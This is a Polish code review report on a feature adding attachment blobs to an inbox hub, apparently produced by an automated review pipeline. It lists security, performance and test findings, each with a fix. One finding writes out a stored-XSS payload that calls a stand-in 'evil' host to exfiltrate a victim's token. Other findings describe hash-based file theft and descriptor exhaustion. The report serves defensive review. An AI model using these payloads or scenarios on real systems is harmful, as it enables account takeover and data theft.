# Review fazy 1 — Magazyn bajtów na hubie

Zadanie: `zalaczniki-w-skrzynce`
Branch: `feature/zalaczniki-w-skrzynce`
Data: 2026-09-03
Severity gate: **ZASTRZEZENIA** (0×P1, 5×P2 kodowych)

## Statystyki

| Metryka | Wartość |
|---|---|
| P1 (KOD/TEST/E2E) | 0 |
| P2 (KOD/TEST/E2E) | 5 |
| P3 (KOD/TEST/E2E) | 8 |
| OPERATOR (poza fix) | 1 |
| Razem findingów | 15 |
| Przebiegi E2E | brak (tester pominięty przez routing) |

Rozkład P2/P3 po plikach: `server.js` (3), `lib/inbox-blobs.js` (4), `lib/inbox-api.js` (2), `lib/inbox-db.js` (2), testy (2).

---

## Findingi

### P2 — 🟠 do naprawy przed zamknięciem fazy

#### [P2/KOD] `server.js:914` — `Content-Type` z pola kontrolowanego przez nadawcę na publicznym endpoincie

`streamFileToResponse` ustawia `Content-Type` WPROST z `decision.attachment.mime`, czyli z pola, które w całości pochodzi od nadawcy (`normalizeAttachment` w `lib/inbox-db.js:481` sprawdza wyłącznie długość ≤255 — `text/html` przechodzi). Odpowiedź nie ma ani `X-Content-Type-Options: nosniff`, ani `Content-Disposition: attachment`, a endpoint `/inbox/v1/:token/blob/:sha256` jest PUBLICZNY (stoi przed guardem XFF, chodzi przez Funnel) i ma globalne `Access-Control-Allow-Origin: *` (`server.js:939`).

Scenariusz: członek A wysyła plik z `mime:'text/html'` i treścią `<script>fetch('https://evil/'+location.href)</script>`; adresat B otwiera link do bajtów w przeglądarce — skrypt wykonuje się na ORIGINIE HUBA, a token B leży w tym samym URL-u (`location.href`), więc atakujący dostaje pełną tożsamość ofiary w hubie (pull cudzych wątków, send w jej imieniu) — dokładnie ta klasa awarii, przed którą broni reguła o sekretach poza cwd agenta. Ten sam skrypt może same-origin odpytać `/inbox/v1/<token>/pull` i wypompować całą skrzynkę.

Naprawa: (1) w `streamFileToResponse` serwuj `application/octet-stream`, chyba że mime trafia w wąską allowlistę bezpiecznych typów; (2) zawsze dokładaj `X-Content-Type-Options: nosniff` i `Content-Disposition: attachment` (nazwa pliku NIE musi tam trafiać); (3) w `normalizeAttachment` waliduj kształt mime wzorcem `^[a-z0-9][a-z0-9.+-]*\/[a-z0-9][a-z0-9.+-]*$` — dziś mime z CR/LF przechodzi walidację, a `res.writeHead` rzuca `ERR_INVALID_CHAR` i zamienia pobranie w 500. Brak testu odmowy dla każdego z tych wektorów (mime `text/html`, mime z CRLF, mime `image/svg+xml`).

#### [P2/KOD] `lib/inbox-db.js:553` — hash staje się uprawnieniem przez jeden dodatkowy INSERT

Model autoryzacji odczytu bajtów (`findAttachmentForUser` + `authorizeBlobRequest` w `lib/inbox-api.js:275`) brzmi „jesteś stroną JAKIEJKOLWIEK wiadomości wskazującej ten sha256", a wiadomość może sfabrykować sam atakujący: `sendMessage` nie zabrania adresowania do samego siebie i nie sprawdza, kto wgrał bajty.

Scenariusz po wpięciu `attachments` w `send` (faza 2): hash wycieka do renderu Skrzynki/archiwum/logów, obcy członek robi `send` do samego siebie z `attachments:[{sha256:<cudzy hash>, …}]`, staje się `from_user` wiersza i `findAttachmentForUser` zwraca mu rekord — pobiera cudzy poufny plik. To wywraca komentarz „sam hash NIE jest uprawnieniem".

Naprawa w warstwie danych, zanim faza 2 zbuduje na tym API: zapamiętaj wgrywającego (kolumna `uploaded_by` zapisywana na ścieżce PUT albo tabela `inbox_blob_uploads(sha256, uploaded_by, created_at)`) i w `findAttachmentForUser` wymagaj, żeby wiersz wiadomości pochodził od nadawcy, który te bajty realnie wgrał — albo odrzucaj w `send` załączniki o sha256 wgranym przez kogoś innego niż nadawca. Dołóż test odmowy: członek spoza wątku, który wysłał wiadomość do samego siebie z cudzym sha256, dostaje 404 na GET.

#### [P2/KOD] `lib/inbox-blobs.js:155` — dedup wykrywany dopiero po zapisaniu całego pliku

`writeBlobFromStream` bezwarunkowo otwiera fd na tmp (linia 118), przepompowuje cały strumień, liczy hash, a istnienie docelowego blobu sprawdza dopiero w `if (fs.existsSync(target))` na linii 155 — po czym kasuje świeżo zapisaną kopię. Checkbox IU-3 mówi „PUT blobu już istniejącego → 200 bez ponownego zapisu (R4)", a zapis realnie następuje; test HTTP (`server.inbox.http.test.js:337`) sprawdza tylko liczbę plików w magazynie, więc tego nie łapie.

Faza 2 czyni duplikat ścieżką RUTYNOWĄ: `uploadBlob` retryuje po timeoucie (retry po udanym, ale nieodebranym zapisie = drugi pełny transfer), a ten sam plik do N adresatów to N pełnych transferów — nadawca 25 MB do trzech osób powoduje 75 MB zapisu na dysk VPS zamiast 25 MB.

Naprawa: w `writeBlobFromStream`, zaraz po `assertValidSha256(expectedSha)` i walidacji `maxBytes`, dodać short-circuit `if (hasBlob(expectedSha)) return { sha256: expectedSha, size: fs.statSync(blobPath(expectedSha)).size, deduped: true };` — PRZED `fs.mkdirSync(tmpDir)`/`fs.openSync`; równolegle w `server.js` w `streamBodyToFile` (linia 872) przy wyniku `deduped === true` ustawić `res.setHeader('Connection','close')` i `res.once('finish', () => req.destroy())` (wzorzec z `rejectBlob`), żeby nie dumpować niedokończonego ciała PUT-a. Kontrakt odpowiedzi (`sha256`, `size`, `deduped`) zostaje bez zmian; dodać test, że drugi PUT nie tworzy pliku w `tmp` i nie czyta całego ciała. *(sceptyk sugerował P3 — utrzymane P2 ze względu na rozjazd z deklarowanym kontraktem IU-3)*

#### [P2/KOD] `lib/inbox-blobs.js:140` — moduł niszczy cudzy strumień (naruszenie granicy warstw)

`writeBlobFromStream` w bloku catch woła `stream.destroy()` na strumieniu, którego NIE jest właścicielem — w produkcji jest to `req` serwera HTTP, czyli gniazdo sieciowe. Cyklem życia `req` zarządza skorupa w `server.js` (`rejectBlob` robi `res.setHeader('Connection','close')` + `res.once('finish', () => req.destroy())` dokładnie po to, żeby zabić socket DOPIERO po flushu odpowiedzi). Magazyn blobów robi to samo wcześniej, zanim odpowiedź 413/400 zostanie w ogóle zapisana — dwa miejsca ubijają to samo gniazdo w odwrotnej kolejności, a poprawność odpowiedzi dla klienta zależy dziś od szczegółu implementacyjnego Node. Dodatkowo dla przyszłych wołających spoza HTTP (klient fazy 2 wysyłający `createReadStream` pliku z dysku) moduł niszczyłby cudzy strumień jako efekt uboczny błędu zapisu.

Akcja: usuń linię `if (typeof stream.destroy === 'function') stream.destroy();` z `lib/inbox-blobs.js:140` — sprzątanie źródła należy do skorupy `server.js` (`rejectBlob`), moduł odpowiada wyłącznie za plik tymczasowy (`out.destroy()` + `removeTemp`).

#### [P2/KOD] `server.js:912` — wyciek deskryptora między `createReadStream` a `writeHead`

`streamFileToResponse` otwiera strumień pliku PRZED `statSync` i `writeHead`, a między tymi krokami nie ma żadnego sprzątania: jeśli którakolwiek z linii 912–915 rzuci, `stream` zostaje żywy i nikt go nie niszczy (listenery `'error'`/`'close'` są dopinane dopiero po `writeHead`).

Scenariusz awarii (potwierdzony empirycznie): załącznik z mime zawierającym CR/LF → `res.writeHead` rzuca `TypeError ERR_INVALID_CHAR` (stack: `server.js:913`) → wyjątek leci do globalnego catch w `createServer` (500), a `createReadStream` już otworzył deskryptor, który nigdy nie zostanie zamknięty. Uprawniony członek może powtarzać ten GET 30×/min (limit kubła binarnego) i wyczerpać deskryptory procesu huba (EMFILE) — daemon przestaje przyjmować połączenia. Ten sam wyciek daje wyścig `statSync`/ENOENT (retencja z fazy 4 kasuje blob między `existsSync` w `openBlobRead` a `statSync`).

Naprawa: policz `size` i zbuduj nagłówki PRZED `openBlobRead`, albo owiń linie 912–915 w try/catch z `stream.destroy()` przed rzutem/500.

#### [P2/KOD] `lib/inbox-api.js:88` — regex URL przepuszcza nadmiarowy segment dla KAŻDEJ akcji

Nowy `INBOX_URL_PATTERN` dopuszcza opcjonalny trzeci segment dla wszystkich akcji, nie tylko binarnych, więc nadmiarowy segment przechodzi tam, gdzie wcześniej dawał `null` — a checkbox IU-3 i komentarz nad regexem twierdzą coś przeciwnego („nadmiarowe segmenty nie przechodzą", regex jest granicą bezpieczeństwa).

Scenariusz (potwierdzony na żywym serwerze): `GET /inbox/v1/<token>/ping/dowolny-smiec` zwraca 200 `{"v":1,"user":…}` zamiast 404; `POST /inbox/v1/<token>/pull/x` wykonuje pełny pull. Skutek: błąd konstrukcji URL po stronie klienta (`inbox-client.mjs`, faza 2/3) nigdy się nie ujawni, a hub odpowiada tą samą operacją pod nieskończenie wieloma URL-ami (rozjazd z deklarowanym kontraktem wersjonowania ścieżki). Testy pokrywają wyłącznie wariant 4-segmentowy dla `blob`, więc regresja jest niewidoczna.

Naprawa: dopuść trzeci segment tylko dla akcji binarnych (odrzucaj `param !== null` dla action spoza `BINARY_ACTIONS` w `matchInboxToken`) + test na `/inbox/v1/tok/pull/x` → `null`. *(sceptyk sugerował P3 — utrzymane P2: linia jest deklarowaną granicą bezpieczeństwa)*

### P2 — OPERATOR (poza fix)

#### [P2/OPERATOR] `docs/active/zalaczniki-w-skrzynce/zalaczniki-w-skrzynce-zadania.md:332` — realny transfer 25 MB przez Funnel

Weryfikacja niewykonalna headless. Harness (`server.inbox.http.test.js`) chodzi po loopbacku, więc nie dowodzi zachowania proxy: buforowania ciała PUT, limitu rozmiaru żądania po stronie Funnela ani timeoutu na kilkunastosekundowym transferze. To jedyna weryfikacja profilu wydajnościowego ścieżki binarnej w realnym środowisku — ryzyko: Funnel ucina ciało albo zamyka połączenie powyżej pewnego progu i każdy większy załącznik kończy się zerwanym transferem, czego loopback nie pokaże.

Operator: wyślij 25 MB PUT-em na `/inbox/v1/<token>/blob/<sha256>` przez publiczny URL Funnela, zmierz czas i kod odpowiedzi (oczekiwane 200), a następnie powtórz to samo żądanie i sprawdź `deduped:true` oraz brak śmieci w `data/inbox-blobs/tmp`. Nie jest to defekt kodu — nie idzie do fix.

### P3 — 🟡 drobne (przekazane do fixa razem z P2)

- **[P3/KOD] `server.js:912`** — `const size = fs.statSync(inboxBlobs.blobPath(decision.sha256)).size;` biegnie już PO `openBlobRead`, więc kasowanie blobu (faza 4 — retencja/rewokacja) między tymi operacjami daje ENOENT wychodzący z `handleInboxBlob` jako generyczne 500 zamiast 404 obiecanego kontraktem intruza. Zamień na `let size; try { size = fs.statSync(inboxBlobs.blobPath(decision.sha256)).size; } catch (err) { if (err.code === 'ENOENT') { stream.destroy(); res.writeHead(404); return res.end(); } throw err; }`.
- **[P3/KOD] `server.js:872`** — `streamBodyToFile` ignoruje zadeklarowany `Content-Length` i odkrywa przekroczenie limitu dopiero w strumieniu, po przyjęciu i zapisaniu 25 MB. Dodaj na początku funkcji, przed `await inboxBlobs.writeBlobFromStream(…)`: `const declared = Number(req.headers['content-length']); if (Number.isFinite(declared) && declared > decision.maxBytes) return rejectBlob(req, res, { status: 413, json: { v: INBOX_API_VERSION, error: 'too_large' } });` — kształt odpowiedzi identyczny jak z `blobErrorStatus('too_large')`.
- **[P3/KOD] `lib/inbox-api.js:71`** — wpis `blob: ['PUT', 'GET'],` w `ENDPOINT_METHODS` to martwy kod i jedyny element mapy o innym typie niż reszta (string vs tablica); `handleInboxRequest` odrzuca akcje binarne fail-closed w kroku 0, realną bramkę metody trzyma `authorizeBlobRequest` (linia 257). Usuń wpis, zostaw jednolinijkowy komentarz o `authorizeBlobRequest`.
- **[P3/KOD] `lib/inbox-blobs.js:141`** — `removeTemp(tmpFile)` biegnie natychmiast po `out.destroy()`, przy wciąż otwartym deskryptorze (`destroy()` zamyka fd asynchronicznie). Na Windows `unlinkSync` pada wtedy EPERM/EBUSY i plik `.part` zostaje przy KAŻDYM przerwanym transferze. W bloku catch zamień `out.destroy();` na `out.destroy(); await once(out, 'close').catch(() => {});` przed `removeTemp(tmpFile)`.
- **[P3/KOD] `lib/inbox-db.js:464`** — guard nazwy pliku odrzuca separator i NUL, ale przepuszcza `.` i `..`, które trafią do `path.join` przy zapisie do vaulta (faza 3) i wskażą katalog zamiast pliku (EISDIR/EPERM). Dorzuć w tym samym `if` warunek `filename === '.' || filename === '..'` z tym samym błędem `invalid_attachment`.
- **[P3/KOD] `lib/inbox-blobs.js:161`** — `fs.mkdirSync(path.dirname(target))` i `fs.renameSync(tmpFile, target)` leżą POZA blokiem try, więc każdy błąd finalizacji (ENOSPC, EACCES, EXDEV, EPERM na Windows) zostawia `.part` w `data/inbox-blobs/tmp` na zawsze i wypuszcza nietypowany `Error`. Owiń te dwie linie w `try { … } catch (err) { removeTemp(tmpFile); throw err; }`.
- **[P3/TEST] `lib/inbox-blobs.test.js:102`** — granica limitu rozmiaru nieprzybita: jedyny test przekroczenia używa 50 B przy `maxBytes=30`, więc pomyłka `>` ↔ `>=` w `lib/inbox-blobs.js:126` przeszłaby niezauważona (a `>=` odrzucałoby pliki dokładnie 25 MiB, reklamowane jako dozwolone). Dopisz test: treść o DOKŁADNIE `maxBytes` bajtach zapisuje się poprawnie (`deduped:false`, plik istnieje), a `maxBytes+1` rzuca `InboxBlobError` z code `too_large`.
- **[P3/TEST] `server.inbox.http.test.js:456`** — gałąź `blob_not_found` w `streamFileToResponse` (`server.js:903–907`, metadane w bazie są, bajtów na dysku nie ma) nie ma żadnego testu, a stanie się normalnym stanem po fazie 4. Dopisz test HTTP: wyślij wiadomość z załącznikiem przez `sendWithAttachment` BEZ uprzedniego PUT-a bajtów i asertuj, że GET blobu przez stronę wiadomości zwraca 404 z pustym ciałem (nie 500).

---

## Obalone przez verify (nie do naprawy)

Brak — kazdy weryfikowany finding przetrwal probe obalenia.

---

## Bookkeeping checkboxów Weryfikacja: / Test: [E2E]

Niezaznaczone wiersze fazy 1 pasujące do `^\s*-\s*\[\s*\]\s*(Weryfikacja:|Test:\s*\[E2E\])`: 4 (wszystkie kategorii CLI; zero checkboxów `[E2E]` w tej fazie).

| Linia | Komenda | Exit | Wynik |
|---|---|---|---|
| IU-1 | `node --test lib/inbox-db.test.js` | 0 | ✅ odznaczone |
| IU-2 | `node --test lib/inbox-blobs.test.js` | 0 | ✅ odznaczone |
| IU-3 | `node --test lib/inbox-api.test.js` | 0 | ✅ odznaczone |
| IU-3 | `node --test server.inbox.http.test.js` | 0 | ✅ odznaczone (16/16 pass) |

Zero FAIL, zero SKIP → brak nowych P2 z bookkeepingu. Tester E2E został pominięty przez routing, ale faza nie zawiera ani jednego checkboxa `[E2E]`, więc nic nie zostało bez dowodu.

---

## Przebieg review

| Etap | Wartosc |
|---|---|
| Pliki w fazie (z tego kodu) | 13 (9) |
| Flagi warstw | ui=false dane=true typowanie=false nowyModul=true |
| Checkboxy `[E2E]` (Test: + Weryfikacja:) | 0 |
| Tryb testera E2E | pominiety |
| Tester E2E | pominiety przez routing |
| Przebiegi E2E PASS / FAIL / SKIP | 0 / 0 / 0 |
| Reviewerzy aktywni | security, performance, code-quality, correctness, spec-compliance, test-coverage |
| Reviewerzy pominieci | e2e (zero checkboxow [E2E] (0) i brak makiet figma_screens) |
| Findingi: znalezione -> dedup JS -> dedup semantyczny | 25 -> 24 -> 15 |
| P3 odrzucone limitem globalnym | 0 |
| Adversarial verify: weryfikowane / obalone / bez glosow | 6 / 0 / 0 |
